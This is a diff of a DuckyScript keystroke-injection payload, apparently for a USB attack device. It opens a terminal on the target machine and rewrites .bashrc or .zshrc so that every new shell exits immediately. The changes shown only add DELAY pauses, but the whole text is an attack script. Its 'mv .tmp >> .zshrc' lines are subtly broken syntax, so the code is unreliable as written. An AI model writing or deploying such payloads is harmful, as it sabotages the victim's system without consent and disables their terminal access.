@@ -50,13 +50,18 @@ CTRL-ALT t
 DELAY 2000
 
 STRINGLN echo "exit" > .tmp
+DELAY 500
 
 IF ($ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX == 1) THEN
     STRINGLN cat .zshrc >> .tmp
+    DELAY 500
     STRINGLN mv .tmp >> .zshrc
 ELSE
     STRINGLN cat .bashrc >> .tmp
+    DELAY 500    
     STRINGLN mv .tmp >> .bashrc
 END_IF
+
+DELAY 500
 
 ALT F4
